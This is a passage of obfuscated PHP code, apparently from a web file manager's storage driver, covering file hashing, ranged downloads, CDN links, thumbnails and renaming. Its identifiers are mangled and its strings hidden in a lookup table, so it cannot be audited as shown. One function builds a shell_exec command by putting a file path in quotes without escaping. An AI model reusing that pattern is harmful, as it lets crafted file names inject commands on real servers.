$ìÇ’ø×[8]; foreach ($ÊªÛŸ¸… as $ˆêÖÛŸ¤) { $¨¨¨à°ä = array($ìÇ’ø×[87] => $ˆêÖÛŸ¤[$ìÇ’ø×[87]], $ìÇ’ø×[89] => $ˆêÖÛŸ¤[$ìÇ’ø×[87]], $ìÇ’ø×[78] => $ˆêÖÛŸ¤[$ìÇ’ø×[78]]); if (isset($ˆêÖÛŸ¤[$ìÇ’ø×[79]]) && !$ˆêÖÛŸ¤[$ìÇ’ø×[78]]) { $¨¨¨à°ä[$ìÇ’ø×[79]] = $ˆêÖÛŸ¤[$ìÇ’ø×[79]]; } if (isset($ˆêÖÛŸ¤[$ìÇ’ø×[88]])) { $¨¨¨à°ä[$ìÇ’ø×[88]] = $ˆêÖÛŸ¤[$ìÇ’ø×[88]]; } if (is_array($ˆêÖÛŸ¤[$ìÇ’ø×[90]])) { $¨¨¨à°ä[$ìÇ’ø×[89]] = $ˆêÖÛŸ¤[$ìÇ’ø×[90]][$ìÇ’ø×[87]]; $¨¨¨à°ä[$ìÇ’ø×[79]] = $ˆêÖÛŸ¤[$ìÇ’ø×[90]][$ìÇ’ø×[79]]; $¨¨¨à°ä[$ìÇ’ø×[88]] = $ˆêÖÛŸ¤[$ìÇ’ø×[90]][$ìÇ’ø×[88]]; } else { if (substr($ˆêÖÛŸ¤[$ìÇ’ø×[87]], 0, strlen($ğÛ“¯ê§)) == $ğÛ“¯ê§) { $¨¨¨à°ä[$ìÇ’ø×[87]] = substr($ˆêÖÛŸ¤[$ìÇ’ø×[87]], strlen($ğÛ“¯ê§)); } } $çŞâ™§ = $ˆêÖÛŸ¤[$ìÇ’ø×[78]] ? $ìÇ’ø×[8] : $ìÇ’ø×[12]; $¨¨¨à°ä[$ìÇ’ø×[89]] = rtrim($¨¨¨à°ä[$ìÇ’ø×[89]], $ìÇ’ø×[8]) . $çŞâ™§; $¨¨¨à°ä[$ìÇ’ø×[87]] = $ìÇ’ø×[8] . trim($¨¨¨à°ä[$ìÇ’ø×[87]], $ìÇ’ø×[8]) . $çŞâ™§; if (!$Àğ„§Í©) { $í›Âğ˜ï = explode($ìÇ’ø×[8], trim($¨¨¨à°ä[$ìÇ’ø×[87]], $ìÇ’ø×[8])); $¨¨¨à°ä[$ìÇ’ø×[87]] = $ìÇ’ø×[8] . implode($ìÇ’ø×[8], array_slice($í›Âğ˜ï, 1)) . $çŞâ™§; } $¦ŸŠ®¿¿[] = $¨¨¨à°ä; } return array_sort_by($¦ŸŠ®¿¿, $ìÇ’ø×[87]); } public function upload($ÑŸ•Ë, $€ÃÁòûË, $àÀŠ”Å = false, $¯ôËÈ™• = REPEAT_REPLACE) { } public function uploadFileByID($¶Ó¾·Ãµ, $ñ´çİáı, $íøµ´ª) { } public function uploadFileByPath($È»ç¿ëØ, $‡™Áğ­, $Ğø¼ã·£ = array()) { } public function isUploadServer() { $œÌ‘¹Ï =& $_SERVER[³Ôà×Ó]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $œÌ‘¹Ï[91]) { return !0; } return $GLOBALS[$œÌ‘¹Ï[6]][$œÌ‘¹Ï[92]][$œÌ‘¹Ï[93]]; } public function isFileOutServer() { $Ú¢Ù³ù =& $_SERVER[³Ôà×Ó]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ú¢Ù³ù[91]) { return !0; } return $GLOBALS[$Ú¢Ù³ù[6]][$Ú¢Ù³ù[92]][$Ú¢Ù³ù[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($áÓìº÷Ç) { $·¸¢’‡ =& $_SERVER[³Ôà×Ó]; if (!$this->isCdnHost()) { return $áÓìº÷Ç; } return str_replace(trim(get_url_root($áÓìº÷Ç), $·¸¢’‡[8]), trim($this->cdnHost, $·¸¢’‡[8]), $áÓìº÷Ç); } public function uploadLink($†ç¡¤¥º, $ƒÜòË§ = 0) { $Øí³ï½ç =& $_SERVER[³Ôà×Ó]; if ($this->isUploadServer()) { return; } $¢ÈÏâ†è = $this->getType(); if (!in_array($¢ÈÏâ†è, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $òÙˆŸçÀ = 1024 * 1024 * 10; $ì©úú„Ñ = $ƒÜòË§ <= $òÙˆŸçÀ ? $Øí³ï½ç[95] : $Øí³ï½ç[96]; $Öå½ò¨ü = (!$ƒÜòË§ ? 1 : ceil($ƒÜòË§ / pow(1024, 3))) * 3600 * 4; $áì÷ÄÛÀ = $this->{$ì©úú„Ñ}($†ç¡¤¥º, $Öå½ò¨ü); if ($áì÷ÄÛÀ) { $áì÷ÄÛÀ[$Øí³ï½ç[97]] = $†ç¡¤¥º; $áì÷ÄÛÀ[$Øí³ï½ç[98]] = $¢ÈÏâ†è; } return $áì÷ÄÛÀ; } public function uploadFormData($ ê—Ş¾¡, $Óİğé•˜ = 3600) { } public function multiUploadFormData($€ùéÒû¤, $üÅıÒ»Ò = 3600) { } public function download($µŞ‡Ş‹, $‹¤©º†™) { } public function ext($Ÿ±€İí) { $½óÜïïî =& $_SERVER[³Ôà×Ó]; if (strpos($Ÿ±€İí, $½óÜïïî[8]) === -1) { $ñ¼àİ™Ñ = $Ÿ±€İí; } else { $ñ¼àİ™Ñ = $this->pathThis($Ÿ±€İí); } $æøâé² = $½óÜïïî[12]; if (strstr($ñ¼àİ™Ñ, $½óÜïïî[10])) { $æøâé² = substr($ñ¼àİ™Ñ, strrpos($ñ¼àİ™Ñ, $½óÜïïî[10]) + 1); $æøâé² = strtolower($æøâé²); } if (strlen($æøâé²) > 3 && preg_match($½óÜïïî[99], $æøâé², $›ü”Å»§)) { $æøâé² = $½óÜïïî[12]; } return $æøâé²; } public function pathThis($ĞíÜêØ²) { $òò¬…§  =& $_SERVER[³Ôà×Ó]; $ĞíÜêØ² = str_replace($òò¬…§ [100], $òò¬…§ [8], rtrim($ĞíÜêØ², $òò¬…§ [8])); $ƒ³ÅÊœ = strrpos($ĞíÜêØ², $òò¬…§ [8]); if ($ƒ³ÅÊœ === !1) { return $ĞíÜêØ²; } return substr($ĞíÜêØ², $ƒ³ÅÊœ + 1); } public function pathFather($Ø–Ø—²ê) { $ƒ’ß–Í® =& $_SERVER[³Ôà×Ó]; $Ø–Ø—²ê = str_replace($ƒ’ß–Í®[100], $ƒ’ß–Í®[8], rtrim($Ø–Ø—²ê, $ƒ’ß–Í®[8])); $†—ã‹¿° = strrpos($Ø–Ø—²ê, $ƒ’ß–Í®[8]); if ($†—ã‹¿° === !1) { return $ƒ’ß–Í®[12]; } return substr($Ø–Ø—²ê, 0, $†—ã‹¿° + 1); } public function hashSimple($šÔƒ€à°) { $âôö¤ù¼ =& $_SERVER[³Ôà×Ó]; if (!$šÔƒ€à°) { return md5($âôö¤ù¼[12]); } $äŞ¨€é„ = $this->size($šÔƒ€à°); $’ß…¥ƒ• = 200; $«µËÄÇ  = 50; if ($äŞ¨€é„ <= $’ß…¥ƒ• * $«µËÄÇ ) { return $this->hashMd5($šÔƒ€à°) . $äŞ¨€é„; } $™£Ö¯‚¬ = intval($äŞ¨€é„ / $«µËÄÇ ); $¶®«Â‚Õ = $âôö¤ù¼[12]; for ($üÀàÈÔÒ = 0; $üÀàÈÔÒ < $«µËÄÇ ; $üÀàÈÔÒ++) { $¶®«Â‚Õ .= $this->fileSubstr($šÔƒ€à°, $™£Ö¯‚¬ * $üÀàÈÔÒ, $’ß…¥ƒ•); } $¶®«Â‚Õ .= $this->fileSubstr($šÔƒ€à°, $äŞ¨€é„ - $’ß…¥ƒ•, $’ß…¥ƒ•); return md5($¶®«Â‚Õ) . $äŞ¨€é„; } public static $md5Cache = array(); public function hashMd5($ÊôğŠ’¸) { if (!$ÊôğŠ’¸) { return md5($_SERVER[³Ôà×Ó][12]); } $ÊôğŠ’¸ = $this->iconvSystem($ÊôğŠ’¸); if (isset(self::$md5Cache[$ÊôğŠ’¸])) { return self::$md5Cache[$ÊôğŠ’¸]; } self::$md5Cache[$ÊôğŠ’¸] = $this->hashMd5Shell($ÊôğŠ’¸); if (!self::$md5Cache[$ÊôğŠ’¸]) { self::$md5Cache[$ÊôğŠ’¸] = @md5_file($ÊôğŠ’¸); } return self::$md5Cache[$ÊôğŠ’¸]; } private function hashMd5Shell($ôˆ»»’û) { $Ë‡ø­Àã =& $_SERVER[³Ôà×Ó]; if (!$ôˆ»»’û) { return md5($Ë‡ø­Àã[12]); } if (!function_exists($Ë‡ø­Àã[101])) { return !1; } $øìóÄî‡ = array($Ë‡ø­Àã[102], $Ë‡ø­Àã[103]); $œ³—ËîŞ = Cache::get($Ë‡ø­Àã[104]); if (!$œ³—ËîŞ) { $„š´Ëé» = BASIC_PATH . $Ë‡ø­Àã[105]; $“öé°ä… = md5_file($„š´Ëé»); $œ³—ËîŞ = $Ë‡ø­Àã[106]; foreach ($øìóÄî‡ as $ı¥øÛ½Ó) { $çÌõ¦Ï = shell_exec($ı¥øÛ½Ó . "\40\42{$„š´Ëé»}\42"); if ($çÌõ¦Ï && substr(trim($çÌõ¦Ï), 0, 32) == $“öé°ä…) { $œ³—ËîŞ = $ı¥øÛ½Ó; break; } } Cache::set($Ë‡ø­Àã[104], $œ³—ËîŞ, 3600); } if ($œ³—ËîŞ == $Ë‡ø­Àã[106]) { return !1; } $çÌõ¦Ï = shell_exec($œ³—ËîŞ . "\x20\x22{$ôˆ»»’û}\42"); $çÌõ¦Ï = str_replace($Ë‡ø­Àã[107], $Ë‡ø­Àã[12], $çÌõ¦Ï); return substr($çÌõ¦Ï, 0, 32); } public function link($ÒäòÍ£) { return $ÒäòÍ£; } public function fileOut($‡Æ¾¡ †, $ü¢«¹çæ = false, $Ê›ç = false, $’ÎäîÛŒ = '') { $¢Í¹ˆê =& $_SERVER[³Ôà×Ó]; $this->cacheMethod(null, null); if (!$‡Æ¾¡ † || !$this->exist($‡Æ¾¡ †)) { show_json(LNG($¢Í¹ˆê[108]), !1, $Ê›ç); } $¢†Ù–ø = $this->getType() == $¢Í¹ˆê[109]; $Æ¥­‰”Ã = $GLOBALS[$¢Í¹ˆê[6]][$¢Í¹ˆê[92]][$¢Í¹ˆê[110]][$¢Í¹ˆê[111]]; $õ¥Îƒš = (double) $GLOBALS[$¢Í¹ˆê[6]][$¢Í¹ˆê[92]][$¢Í¹ˆê[110]][$¢Í¹ˆê[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $½¡™¯¯ = $this->infoFull($‡Æ¾¡ †); $Şéö£™ = $½¡™¯¯[$¢Í¹ˆê[79]]; $ˆ®ø’û = gmdate($¢Í¹ˆê[113], $½¡™¯¯[$¢Í¹ˆê[88]]); $ß¸æÈğ¶ = $Ê›ç ? $Ê›ç : $this->iconvApp($½¡™¯¯[$¢Í¹ˆê[32]]); $‘Š×÷Ñ¾ = 0; $“»ò¶ù· = $Şéö£™ - 1; $Şø×¯Ö¨ = $this->ext($ß¸æÈğ¶); if (in_array($Şø×¯Ö¨, array($¢Í¹ˆê[114], $¢Í¹ˆê[115], $¢Í¹ˆê[116], $¢Í¹ˆê[117]))) { $Şø×¯Ö¨ = $¢Í¹ˆê[118]; } if (in_array($Şø×¯Ö¨, array($¢Í¹ˆê[119]))) { $Şø×¯Ö¨ = $¢Í¹ˆê[120]; } if (!$’ÎäîÛŒ) { $’ÎäîÛŒ = md5($ˆ®ø’û . $Şéö£™); } $’ÎäîÛŒ = $¢Í¹ˆê[121] . $’ÎäîÛŒ . $¢Í¹ˆê[121]; $ïê•‡¢ = get_file_mime($Şø×¯Ö¨); $Œ×ŒÌú· = !0; $Œ×ŒÌú· = isset($_GET[$¢Í¹ˆê[122]]) ? !1 : !0; if ($ü¢«¹çæ === !1 && !mime_support($ïê•‡¢)) { $ïê•‡¢ = $¢Í¹ˆê[123]; } header($¢Í¹ˆê[124]); header($¢Í¹ˆê[125] . $ïê•‡¢); $ßôå™¾‚ = rawurlencode($ß¸æÈğ¶); $ßôå™¾‚ = $¢Í¹ˆê[121] . $ßôå™¾‚ . $¢Í¹ˆê[126] . $ßôå™¾‚; if ($ü¢«¹çæ) { header($¢Í¹ˆê[127]); header($¢Í¹ˆê[128] . $ßôå™¾‚); } else { if ($Œ×ŒÌú·) { header($¢Í¹ˆê[129] . $ßôå™¾‚); } } $áòÒÖÃİ = 3600 * 24 * 30; header($¢Í¹ˆê[130]); header($¢Í¹ˆê[131]); header($¢Í¹ˆê[132] . $áòÒÖÃİ); header($¢Í¹ˆê[133] . gmdate($¢Í¹ˆê[113], time() + $áòÒÖÃİ) . $¢Í¹ˆê[134]); if (isset($_SERVER[$¢Í¹ˆê[135]]) && strtotime($_SERVER[$¢Í¹ˆê[135]]) == $½¡™¯¯[$¢Í¹ˆê[88]]) { header($¢Í¹ˆê[136], !0, 304); die; } if (isset($_SERVER[$¢Í¹ˆê[137]]) && $_SERVER[$¢Í¹ˆê[137]] == $’ÎäîÛŒ) { header($¢Í¹ˆê[138] . $’ÎäîÛŒ, !0, 304); die; } header($¢Í¹ˆê[138] . $’ÎäîÛŒ); header($¢Í¹ˆê[139] . $ˆ®ø’û . $¢Í¹ˆê[134]); header($¢Í¹ˆê[140] . $ß¸æÈğ¶); header($¢Í¹ˆê[141]); header($¢Í¹ˆê[142] . $Şéö£™); header($¢Í¹ˆê[143]); Hook::trigger($¢Í¹ˆê[144], $‡Æ¾¡ †, $Şéö£™, $ß¸æÈğ¶, $Şø×¯Ö¨); if (!$ü¢«¹çæ && $Şø×¯Ö¨ == $¢Í¹ˆê[145]) { if ($Şéö£™ > 1024 * 1024 * 5) { die; } $ÄÊÂË² = $this->getContent($‡Æ¾¡ †); $ÄÊÂË² = Html::clearSVG($ÄÊÂË²); header($¢Í¹ˆê[146] . strlen($ÄÊÂË²)); echo $ÄÊÂË²; die; } $Ï§«Ïá‹ = strtolower($_SERVER[$¢Í¹ˆê[147]]); if ($¢†Ù–ø && $Ï§«Ïá‹ && $Æ¥­‰”Ã) { if (strstr($Ï§«Ïá‹, $¢Í¹ˆê[148])) { header($¢Í¹ˆê[149] . $‡Æ¾¡ †); } else { if (strstr($Ï§«Ïá‹, $¢Í¹ˆê[150])) { header($¢Í¹ˆê[151] . $‡Æ¾¡ †); } else { if (strstr($Ï§«Ïá‹, $¢Í¹ˆê[152])) { header($¢Í¹ˆê[153] . $‡Æ¾¡ †); } } } if ($õ¥Îƒš) { header($¢Í¹ˆê[154] . $õ¥Îƒš); } return; } if (isset($_SERVER[$¢Í¹ˆê[155]])) { if (preg_match($¢Í¹ˆê[156], $_SERVER[$¢Í¹ˆê[155]], $ÖŞƒ—¯ø)) { $‘Š×÷Ñ¾ = intval($ÖŞƒ—¯ø[1]); $‘Š×÷Ñ¾ = $‘Š×÷Ñ¾ <= 0 ? 0 : ($‘Š×÷Ñ¾ >= $“»ò¶ù· ? $“»ò¶ù· : $‘Š×÷Ñ¾); if (!empty($ÖŞƒ—¯ø[2])) { $”Ä„Ë·® = intval($ÖŞƒ—¯ø[2]); $“»ò¶ù· = $”Ä„Ë·® < $‘Š×÷Ñ¾ ? $‘Š×÷Ñ¾ : ($”Ä„Ë·® >= $“»ò¶ù· ? $“»ò¶ù· : $”Ä„Ë·®); } } header($¢Í¹ˆê[157]); header("\x43\157\x6e\164\145\156\x74\x2d\x52\x61\x6e\147\x65\72\40\x62\x79\164\x65\163\x20{$‘Š×÷Ñ¾}\x2d{$“»ò¶ù·}\57" . $Şéö£™); } else { header($¢Í¹ˆê[158]); } header($¢Í¹ˆê[159]); header($¢Í¹ˆê[160]); $Åì¶²’Î = !0; if ($_SERVER[$¢Í¹ˆê[161]] == $¢Í¹ˆê[162] && $Şéö£™ > 1204 * 1024 * 1024 * 2) { $Åì¶²’Î = !1; } if ($Åì¶²’Î) { header($¢Í¹ˆê[163] . ($“»ò¶ù· - $‘Š×÷Ñ¾ + 1)); } if ($_SERVER[$¢Í¹ˆê[164]] == $¢Í¹ˆê[165]) { return; } $³Ç©ô¢¥ = array($¢Í¹ˆê[166] => !1, $¢Í¹ˆê[167] => $‘Š×÷Ñ¾, $¢Í¹ˆê[168] => $“»ò¶ù·, $¢Í¹ˆê[169] => $Şø×¯Ö¨, $¢Í¹ˆê[170] => $½¡™¯¯, $¢Í¹ˆê[171] => $¢Í¹ˆê[12], $¢Í¹ˆê[172] => 0); $³Ç©ô¢¥ = Hook::filter($¢Í¹ˆê[173], $³Ç©ô¢¥); $öëı—æµ = 1024 * 300; $åÜºÖ·ü = 0; if ($õ¥Îƒš) { $åÜºÖ·ü = intval(1000 * 1000 * ($öëı—æµ / $õ¥Îƒš)); } while ($‘Š×÷Ñ¾ <= $“»ò¶ù·) { $„ÛüùÅ” = timeFloat(); check_abort(); $»û¨÷™÷ = $“»ò¶ù· - $‘Š×÷Ñ¾ + 1; if ($»û¨÷™÷ <= $öëı—æµ) { $öëı—æµ = $»û¨÷™÷; } $ÄÊÂË² = $this->fileSubstr($‡Æ¾¡ †, $‘Š×÷Ñ¾, $öëı—æµ); if ($³Ç©ô¢¥[$¢Í¹ˆê[166]]) { $³Ç©ô¢¥[$¢Í¹ˆê[171]] = $ÄÊÂË²; $³Ç©ô¢¥[$¢Í¹ˆê[172]] = $‘Š×÷Ñ¾; $³Ç©ô¢¥ = Hook::filter($¢Í¹ˆê[174], $³Ç©ô¢¥); $ÄÊÂË² = $³Ç©ô¢¥[$¢Í¹ˆê[171]]; } echo $ÄÊÂË²; $‘Š×÷Ñ¾ += $öëı—æµ; if ($öëı—æµ == $»û¨÷™÷) { $‘Š×÷Ñ¾ = $“»ò¶ù· + 1; } if ($åÜºÖ·ü) { $ÅÌåç±à = intval(1000 * 1000 * (timeFloat() - $„ÛüùÅ”)); $ôÇ­÷ß = $åÜºÖ·ü - $ÅÌåç±à; if ($ôÇ­÷ß > 5) { usleep($ôÇ­÷ß); } } } } public function fileOutServer($ô—ÈÄıŠ, $˜üÙªèØ = false, $µòÔÄìÔ = false, $±ãìËç = '') { $this->fileOut($ô—ÈÄıŠ, $˜üÙªèØ, $µòÔÄìÔ, $±ãìËç); } public function fileOutLink($¶œ‡Å£ö) { header($_SERVER[³Ôà×Ó][175] . $¶œ‡Å£ö); die; } public function cacheMethod($äôš¦…±, $ª¶õºÏ’, $˜Õì¯ÄÓ = null) { $é£ÔÁÈÎ =& $_SERVER[³Ôà×Ó]; static $ÕËÄ†¡¤ = array(); $„™÷ÉÛâ = $ª¶õºÏ’ ? ltrim($this->getPathOuter($ª¶õºÏ’), $é£ÔÁÈÎ[8]) : $é£ÔÁÈÎ[12]; $ãÚÁ»˜ = $é£ÔÁÈÎ[176] . $äôš¦…± . $é£ÔÁÈÎ[177] . rtrim($„™÷ÉÛâ, $é£ÔÁÈÎ[8]); if (is_null($äôš¦…±)) { $ÕËÄ†¡¤ = array(); return; } if (is_null($ª¶õºÏ’)) { foreach ($ÕËÄ†¡¤ as $ãÚÁ»˜ => $üĞÎÄİ) { if (!strstr($ãÚÁ»˜, $é£ÔÁÈÎ[176] . $äôš¦…± . $é£ÔÁÈÎ[178])) { continue; } unset($ÕËÄ†¡¤[$ãÚÁ»˜]); } return; } if (!is_null($˜Õì¯ÄÓ)) { $ÕËÄ†¡¤[$ãÚÁ»˜] = $˜Õì¯ÄÓ; return; } $©”Ô¼¡ô = isset($ÕËÄ†¡¤[$ãÚÁ»˜]) ? $ÕËÄ†¡¤[$ãÚÁ»˜] : null; if (!is_null($©”Ô¼¡ô)) { return $©”Ô¼¡ô; } $©”Ô¼¡ô = $this->{$äôš¦…±}($ª¶õºÏ’); $ÕËÄ†¡¤[$ãÚÁ»˜] = $©”Ô¼¡ô; return $©”Ô¼¡ô; } public function cacheMethodInfoSet($¾•„Ú„Ê, $œ¿Ã¢Àó, $êÑüè—ş = false) { $Ö“ñ¦‹º =& $_SERVER[³Ôà×Ó]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ö“ñ¦‹º[179], $¾•„Ú„Ê, $œ¿Ã¢Àó); $this->cacheMethod($Ö“ñ¦‹º[180], $¾•„Ú„Ê, $œ¿Ã¢Àó ? !1 : !0); if (is_array($êÑüè—ş)) { $this->cacheMethod($Ö“ñ¦‹º[181], $¾•„Ú„Ê, $êÑüè—ş); } } public function fileOutImage($ÎÔØŠÙŸ, $µÀã…º = 250) { $ÌÛí·Ê =& $_SERVER[³Ôà×Ó]; set_timeout(); if (substr($ÎÔØŠÙŸ, 0, 4) == $ÌÛí·Ê[152]) { $this->fileOutLink($ÎÔØŠÙŸ); } $Ôˆ™¡Á¿ = $this->info($ÎÔØŠÙŸ); $¤’ëÙÅ = !1; $Âø©· Ö = isset($GLOBALS[$ÌÛí·Ê[182]]) ? $GLOBALS[$ÌÛí·Ê[182]] : array(); if ($Âø©· Ö && $Âø©· Ö[$ÌÛí·Ê[183]] == $Ôˆ™¡Á¿[$ÌÛí·Ê[87]]) { $Ôˆ™¡Á¿ = $Âø©· Ö; $ôª¬‚æŠ = $Ôˆ™¡Á¿[$ÌÛí·Ê[184]]; if ($ôª¬‚æŠ && isset($ôª¬‚æŠ[$ÌÛí·Ê[185]])) { if ($ôª¬‚æŠ[$ÌÛí·Ê[185]] <= $µÀã…º && $ôª¬‚æŠ[$ÌÛí·Ê[186]] <= $µÀã…º) { $¤’ëÙÅ = !0; } } } if ($Ôˆ™¡Á¿[$ÌÛí·Ê[79]] <= 1024 * 50 || $¤’ëÙÅ || !function_exists($ÌÛí·Ê[187]) || $Ôˆ™¡Á¿[$ÌÛí·Ê[169]] == $ÌÛí·Ê[188]) { return $this->fileOut($ÎÔØŠÙŸ, !1, $Ôˆ™¡Á¿[$ÌÛí·Ê[32]]); } $¹–ô…­ = kodIO::hashPath($Ôˆ™¡Á¿); $£°Ñ±äÃ = "\x63\x6f\x76\x65\x72\137{$¹–ô…­}\x5f{$µÀã…º}\x2e\x70\x6e\x67"; $ã°÷ğÉª = IO_PATH_SYSTEM_TEMP . $ÌÛí·Ê[189]; $Û•£¢¨Ü = IO::infoFullSimple($ã°÷ğÉª); $ÉÖÚÊúï = $Û•£¢¨Ü && is_array($Û•£¢¨Ü) ? $Û•£¢¨Ü[$ÌÛí·Ê[87]] : $ÌÛí·Ê[12]; if (!$ÉÖÚÊúï) { $ÉÖÚÊúï = IO::mkdir($ã°÷ğÉª); } if ($Ôˆ™¡Á¿[$ÌÛí·Ê[190]] == $ÌÛí·Ê[191] && isset($Ôˆ™¡Á¿[$ÌÛí·Ê[192]]) && $Ôˆ™¡Á¿[$ÌÛí·Ê[192]] == kodIO::sourceID($ÉÖÚÊúï)) { $ŸÄ¡çõ¿ = $Ôˆ™¡Á¿[$ÌÛí·Ê[193]]; if ($µÀã…º <= 500) { $‰¶øØ¼ = preg_replace($ÌÛí·Ê[194], $ÌÛí·Ê[195], $Ôˆ™¡Á¿[$ÌÛí·Ê[32]]); $ŸÄ¡çõ¿ = IO::fileNameExist($ÉÖÚÊúï, $‰¶øØ¼); } return IO::fileOut(KodIO::make($ŸÄ¡çõ¿), !1, $Ôˆ™¡Á¿[$ÌÛí·Ê[32]]); } $àØ¤Äø = IO::fileNameExist($ÉÖÚÊúï, $£°Ñ±äÃ); if ($àØ¤Äø) { return IO::fileOut(KodIO::make($àØ¤Äø), !1, $Ôˆ™¡Á¿[$ÌÛí·Ê[32]]); } if ($µÀã…º > 1000) { $this->makeImageCover($ÉÖÚÊúï, $ÎÔØŠÙŸ, $£°Ñ±äÃ, $µÀã…º); $this->makeImageCover($ÉÖÚÊúï, $ÎÔØŠÙŸ, "\x63\x6f\166\145\x72\137{$¹–ô…­}\137\62\65\x30\x2e\x70\156\x67", 250); $àØ¤Äø = IO::fileNameExist($ÉÖÚÊúï, $£°Ñ±äÃ); if ($àØ¤Äø) { return IO::fileOut(KodIO::make($àØ¤Äø), !1, $Ôˆ™¡Á¿[$ÌÛí·Ê[32]]); } die; } $›ƒ¼Ôèù = Cache::get($£°Ñ±äÃ); if ($›ƒ¼Ôèù == $ÌÛí·Ê[196] || $›ƒ¼Ôèù == $ÌÛí·Ê[197]) { echo $›ƒ¼Ôèù; die; } Cache::set($£°Ñ±äÃ, $ÌÛí·Ê[197], 60); $ó¢ûç„¯ = array($ÉÖÚÊúï, $Ôˆ™¡Á¿[$ÌÛí·Ê[87]], $£°Ñ±äÃ, $µÀã…º); $™æ­™õ§ = $ÌÛí·Ê[198] . $Ôˆ™¡Á¿[$ÌÛí·Ê[79]] . $ÌÛí·Ê[199] . $£°Ñ±äÃ . $ÌÛí·Ê[200] . $Ôˆ™¡Á¿[$ÌÛí·Ê[32]] . $ÌÛí·Ê[201] . $Ôˆ™¡Á¿[$ÌÛí·Ê[87]]; TaskQueue::add($ÌÛí·Ê[202], $ó¢ûç„¯, $™æ­™õ§, $£°Ñ±äÃ); } public function makeImageCover($ó¹È¦ğç, $•¦¹Åïò, $ÔÊ¸†·, $÷’Ö‚–) { $òÆ÷™•ª =& $_SERVER[³Ôà×Ó]; if (IO::fileNameExist($ó¹È¦ğç, $ÔÊ¸†·)) { return $òÆ÷™•ª[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Éº¿—ÖÈ = DATA_THUMB . $ÔÊ¸†·; del_file($Éº¿—ÖÈ); $ÀÒ¥òú = TEMP_FILES . $ÔÊ¸†·; if (!@file_exists($ÀÒ¥òú)) { $ÀÒ¥òú = $this->download($•¦¹Åïò, $ÀÒ¥òú); } if (!@file_exists($ÀÒ¥òú)) { return $òÆ÷™•ª[204]; } ImageThumb::createThumb($ÀÒ¥òú, $Éº¿—ÖÈ, $÷’Ö‚–, $÷’Ö‚– * 10); if (@file_exists($Éº¿—ÖÈ)) { Cache::remove($ÔÊ¸†·); return IO::move($Éº¿—ÖÈ, $ó¹È¦ğç); } Cache::set($ÔÊ¸†·, $òÆ÷™•ª[196], 600); del_file($Éº¿—ÖÈ); return $òÆ÷™•ª[205] . $ÀÒ¥òú . $òÆ÷™•ª[74]; } public function fileOutImageServer($‡Áö„ôÏ, $üÊ¨çï = 250) { $this->fileOutImage($‡Áö„ôÏ, $üÊ¨çï); } public function fileNameAuto($¥åø½ÒŠ, $×ğøÒûÒ, $ÎûÄÄì¢ = REPEAT_RENAME, $®ÚŠ½Û = false) { $äâı„ì¼ =& $_SERVER[³Ôà×Ó]; $É×½øéß = $¥åø½ÒŠ === $äâı„ì¼[12] ? $×ğøÒûÒ : rtrim($¥åø½ÒŠ, $äâı„ì¼[8]) . $äâı„ì¼[8] . $×ğøÒûÒ; if ($ÎûÄÄì¢ == REPEAT_REPLACE || !$this->exist($É×½øéß) || $®ÚŠ½Û && $ÎûÄÄì¢ != REPEAT_RENAME_FOLDER) { return $×ğøÒûÒ; } if ($ÎûÄÄì¢ == REPEAT_SKIP) { return !1; } $‰µ•³ì = $äâı„ì¼[10] . get_path_ext($×ğøÒûÒ); $‰µ•³ì = $‰µ•³ì == $äâı„ì¼[10] || $®ÚŠ½Û ? $äâı„ì¼[12] : $‰µ•³ì; $Ş¯ûÇìğ = 1; $¥«öŒé = substr($×ğøÒûÒ, 0, strlen($×ğøÒûÒ) - strlen($‰µ•³ì)); $»£§Øıƒ = $¥«öŒé . "\50{$Ş¯ûÇìğ}\x29{$‰µ•³ì}"; while ($this->exist(rtrim($¥åø½ÒŠ, $äâı„ì¼[8]) . $äâı„ì¼[8] . $»£§Øıƒ)) { $»£§Øıƒ = $¥«öŒé . "\x28{$Ş¯ûÇìğ}\51{$‰µ•³ì}"; $Ş¯ûÇìğ++; } return $»£§Øıƒ; } private function fileNameAutoList($“Ü†ˆÛõ, $å¤ûšƒö, $Ò·ÃÔŒÓ = false) { $ş½±Ä¿ =& $_SERVER[³Ôà×Ó]; $ÅÙ¼¼¥¯ = $this->listPath($“Ü†ˆÛõ, !0); $ÅÙ¼¼¥¯ = array_merge($ÅÙ¼¼¥¯[$ş½±Ä¿[85]], $ÅÙ¼¼¥¯[$ş½±Ä¿[86]]); $Ô‰ Ô†Ã = array_to_keyvalue($ÅÙ¼¼¥¯, $ş½±Ä¿[12], $ş½±Ä¿[32]); $ù÷Ë«Óú = $ş½±Ä¿[10] . get_path_ext($å¤ûšƒö); $ù÷Ë«Óú = $ù÷Ë«Óú == $ş½±Ä¿[10] || $Ò·ÃÔŒÓ ? $ş½±Ä¿[12] : $ù÷Ë«Óú; $¶Ççñë = substr($å¤ûšƒö, 0, strlen($å¤ûšƒö) - strlen($ù÷Ë«Óú)); $ºşàÏË” = $¶Ççñë . "\50\x30\51{$ù÷Ë«Óú}"; for ($¦ô¨‰ûÇ = 1; $¦ô¨‰ûÇ <= count($Ô‰ Ô†Ã) + 1; $¦ô¨‰ûÇ++) { $ºşàÏË” = $¶Ççñë . "\x28{$¦ô¨‰ûÇ}\51{$ù÷Ë«Óú}"; if (!in_array_not_case($ºşàÏË”, $Ô‰ Ô†Ã)) { return $ºşàÏË”; } } return $ºşàÏË”; } public function listAllFiles($ÁûÔ´‚, $›ğŸ•àæ) { $¤ñ„’¥Ù =& $_SERVER[³Ôà×Ó]; if (empty($›ğŸ•àæ)) { return array(); } $£¡Î®‘À = array_keys($›ğŸ•àæ); $¸ÚÑÆ•ğ = array(); $ÁûÔ´‚ = trim($ÁûÔ´‚, $¤ñ„’¥Ù[8]); foreach ($›ğŸ•àæ as $ş¸ÕÂŒ± => $‹Í½êŠİ) { $ç¦°Áëº = ltrim(substr(trim($ş¸ÕÂŒ±, $¤ñ„’¥Ù[8]), strlen($ÁûÔ´‚)), $¤ñ„’¥Ù[8]); if (substr($ş¸ÕÂŒ±, -1) == $¤ñ„’¥Ù[8]) { $ç¦°Áëº = 